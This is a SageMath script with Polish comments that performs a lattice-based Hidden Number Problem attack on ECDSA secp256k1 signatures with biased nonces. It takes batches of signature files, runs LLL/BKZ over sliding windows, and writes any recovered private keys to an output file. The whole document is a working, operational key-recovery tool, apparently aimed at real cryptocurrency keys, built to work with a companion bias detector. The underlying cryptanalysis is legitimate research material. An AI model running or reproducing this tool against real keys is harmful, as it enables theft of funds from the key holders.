#!/usr/bin/sage
"""
hnp_lattice.sage -- CZYSTY atak kratowy HNP na ECDSA (secp256k1).

Tylko krata. ZERO tanich atakow, ZERO detektorow dup-r / cross-r,
ZERO statystyk na 'r'. Wchodzi -> okno podpisow, wychodzi -> klucz albo nic.

Model HNP (bias nonce k):
    s*k = z + r*d (mod n)   =>   k = z*s^-1 + (r*s^-1)*d = u + t*d (mod n)
  MSB bias: gorne 'bias' bitow k = 0  ->  0 <= k < 2^(256-bias)
  LSB bias: dolne 'bias' bitow k = 0  ->  k = 2^bias * h, h < 2^(256-bias)

Krata (m podpisow, wymiar m+2):
    diag(C*n) | wiersz t_i | wiersz -u_i ; ostatnie kolumny 1 i W=B.
  Krotki wektor z ostatnia wspolrzedna +-W koduje kandydata d.

ZGODNOSC 1:1 Z bias_scan.sage (detektor):
  * ta sama konstrukcja kraty (build_reduce == lambda1_ratio),
  * ta sama lista biasow BIAS_LEVELS = [4,8,...,224],
  * ta sama formula need_sigs(bias) = max(4, int(256/bias*4/3)),
  * to samo stale m = min(max_m, total) i ta sama kolejnosc okien (step*m),
  * te same domyslne --max-m 48 i --step 0.5.
  Dzieki temu okno (bias, typ, window_start) zaraportowane przez detektor jest
  DOKLADNIE tym samym oknem, ktore atak buduje i redukuje.

Workflow (detektor -> atak celowany):
  1) bias_scan.sage --file X.json --full-grind        # -> bias_report.json
  2) z raportu bierzesz np. bias=8, type=MSB, window_start=504 i:
     hnp_lattice.sage --file X.json --bias 8 --type MSB --start 504

Uzycie:
  sage hnp_lattice.sage --file klucz_159072.json
  sage hnp_lattice.sage --file plik.json --beta 30 --max-m 48
  sage hnp_lattice.sage --file plik.json --bias 8 --type MSB --start 504  # celowane okno
  sage hnp_lattice.sage --file plik.json --full-grind --step 0.5 --max-windows 5000
"""
from sage.all import *
import json, sys, time, argparse

# --- secp256k1 ---
n  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
p  = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEFFFFFC2F
Gx = 0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798
Gy = 0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8
E = EllipticCurve(GF(p), [0, 7])
G = E(Gx, Gy)
n = int(n)

# === 1:1 z bias_scan.sage ===
# Ta sama lista biasow i ta sama formula minimalnej liczby podpisow co detektor,
# zeby atak przeszukiwal DOKLADNIE te same okna (bias, typ, start), ktore
# detektor flaguje jako PRAWDZIWY bias. bias=256 pominiety (B=1, C*n~n^2).
BIAS_LEVELS = [4, 8, 12, 16, 32, 48, 64, 80, 96, 128, 160, 192, 224]

def need_sigs(bias):
    """Minimalna liczba podpisow dla danego biasu (jak w detektorze)."""
    return max(4, int(256 / bias * 4 / 3))

def log(msg):
    print(f"[{time.strftime('%H:%M:%S')}] {msg}", flush=True)

def modinv(a):
    return int(pow(int(a) % n, -1, n))

def build_reduce(rs_win, ss_win, bias, msb, beta):
    """Buduje krate HNP dla jednego okna i zwraca zredukowana baze + W, m."""
    m = len(rs_win)
    if msb:
        t = rs_win[:]
        u = ss_win[:]
        B = 1 << (256 - bias)
    else:
        inv2b = modinv(pow(2, bias, n))
        t = [(r * inv2b) % n for r in rs_win]
        u = [(s * inv2b) % n for s in ss_win]
        B = 1 << (256 - bias)

    C = max(1, n // B)
    W = B
    dim = m + 2
    M = matrix(ZZ, dim, dim)
    for i in range(m):
        M[i, i] = C * n
        M[m, i]     = (C * t[i]) % (C * n)
        M[m + 1, i] = (-C * u[i]) % (C * n)
    M[m, m] = 1
    M[m + 1, m + 1] = W

    # LLL dla duzych wymiarow, BKZ dla mniejszych (jesli sie miesci).
    use_bkz = (beta >= 20 and dim <= beta + 20)
    if use_bkz:
        Bred = M.BKZ(block_size=beta, proof=False)
    else:
        Bred = M.LLL()
    return Bred, W, m

def solve_window(rs_win, ss_win, pub, bias, msb, beta):
    """Zwraca d (int) albo None dla jednego okna."""
    if len(rs_win) < 4:
        return None
    Bred, W, m = build_reduce(rs_win, ss_win, bias, msb, beta)
    for row in Bred.rows():
        last = int(row[m + 1])
        if abs(last) != W:
            continue
        for sign in (1, -1):
            cand = (sign * int(row[m])) % n
            if cand == 0:
                continue
            if cand * G == pub:
                return cand
    return None

def attack_key(key_xy, sigs, args):
    """Atak kratowy na jeden klucz. Zwraca dict wyniku albo None."""
    try:
        xh, yh = key_xy.split("_")
        pub = E(int(xh, 16), int(yh, 16))
    except Exception:
        log(f"  Zly klucz publiczny: {key_xy[:40]}")
        return None

    # Prekompute t=r*s^-1, u=z*s^-1 dla wszystkich podpisow.
    rs_all, ss_all = [], []
    for r, s, z in sigs:
        if r == 0 or s == 0:
            continue
        sinv = modinv(s)
        rs_all.append((r * sinv) % n)
        ss_all.append((z * sinv) % n)
    total = len(rs_all)
    if total < 4:
        return None
    log(f"Klucz {key_xy[:24]}..  podpisow: {total}")

    # === 1:1 z bias_scan.scan_key ===
    # Stale m = min(max_m, total) dla KAZDEGO biasu (jak w detektorze), a nie
    # rozne m per bias. Bias jest pomijany tylko gdy m < need_sigs(bias).
    biases = [args.bias] if args.bias else BIAS_LEVELS
    types  = [args.type] if args.type else ["MSB", "LSB"]
    m = min(args.max_m, total)
    if m < 4:
        return None

    # Kolejnosc okien identyczna jak w detektorze (prep_all + przesuw o int(m*step)).
    if not args.full_grind:
        windows = [(0, m)]
    else:
        step = max(1, int(m * args.step))
        nwin = (total - m) // step + 1
        if args.max_windows and nwin > args.max_windows:
            nwin = args.max_windows
        windows = [(w * step, w * step + m) for w in range(nwin)]

    # --start: atak WYLACZNIE w oknie [start, start+m) (okno z raportu detektora).
    if args.start is not None:
        s0 = args.start
        if s0 + m > total:
            log(f"  --start {s0}: okno wychodzi poza zbior ({s0}+{m}>{total})"); return None
        windows = [(s0, s0 + m)]

    for bias in biases:
        if m < need_sigs(bias):
            continue          # za malo podpisow na ten bias (jak w detektorze)
        for typ in types:
            msb = (typ == "MSB")
            engine = ("BKZ%d" % args.beta) if (args.beta >= 20 and (m + 2) <= args.beta + 20) else "LLL"
            log(f"  bias={bias} {typ}  m={m}  okien={len(windows)}  ({engine}, dim={m+2})")
            for wi, (a, b) in enumerate(windows):
                if b > total:
                    break
                d = solve_window(rs_all[a:b], ss_all[a:b], pub, bias, msb, args.beta)
                if d:
                    log(f"  ZLAMANO! bias={bias} {typ} okno#{wi}@{a}  d=0x{d:064x}")
                    return {"key": key_xy, "privkey": f"0x{d:064x}",
                            "type": typ, "bias": bias, "window": wi, "start": a, "m": m}
                if args.full_grind and (wi + 1) % 200 == 0:
                    log(f"    okno {wi+1}/{len(windows)} (@{a})...")
    return None

def main():
    ap = argparse.ArgumentParser(description="Czysty atak kratowy HNP (secp256k1).")
    src = ap.add_mutually_exclusive_group(required=True)
    src.add_argument("--file", help="pojedynczy plik JSON {key: [[r,s,z],...]}")
    src.add_argument("--dir",  help="katalog z plikami *.json")
    ap.add_argument("--out", default=None, help="plik wyjsciowy (domyslnie <wejscie>_hnp.json)")
    ap.add_argument("--beta", type=int, default=30, help="block_size BKZ (>=20). domyslnie 30")
    ap.add_argument("--max-m", type=int, default=48, help="podpisow w oknie (1:1 z detektorem). domyslnie 48")
    ap.add_argument("--bias", type=int, default=None, help="testuj TYLKO ten bias (bity) -- z raportu detektora")
    ap.add_argument("--type", choices=["MSB", "LSB"], default=None, help="testuj TYLKO ten typ -- z raportu")
    ap.add_argument("--start", type=int, default=None,
                    help="atak TYLKO w oknie [start, start+max_m) -- 'window_start' z raportu detektora")
    ap.add_argument("--full-grind", action="store_true", help="przesuwane okna przez caly zbior (jak detektor)")
    ap.add_argument("--step", type=float, default=0.5, help="krok okna jako ulamek m (0<step<=1). 1:1 z detektorem")
    ap.add_argument("--max-windows", type=int, default=0, help="limit okien. 0=bez")
    args = ap.parse_args()

    import glob, os
    if args.file:
        files = [args.file]
        default_out = args.file.replace(".json", "_hnp.json")
    else:
        files = sorted(glob.glob(os.path.join(args.dir, "*.json")))
        default_out = os.path.join(args.dir, "hnp_results.json")
    out_fn = args.out or default_out
    if not files:
        log("Brak plikow."); sys.exit(1)

    results = []
    t0 = time.time()
    for fn in files:
        try:
            data = json.load(open(fn))
        except Exception as e:
            log(f"BLAD odczytu {fn}: {e}"); continue
        for key_xy, sig_list in data.items():
            sigs = [(int(r, 16), int(s, 16), int(z, 16)) for r, s, z in sig_list]
            res = attack_key(key_xy, sigs, args)
            if res:
                results.append(res)
                json.dump(results, open(out_fn, "w"), indent=2)
    log(f"KONIEC ({time.time()-t0:.0f}s). Zlamano {len(results)} kluczy -> {out_fn}")
    json.dump(results, open(out_fn, "w"), indent=2)

if __name__ == "__main__":
    main()

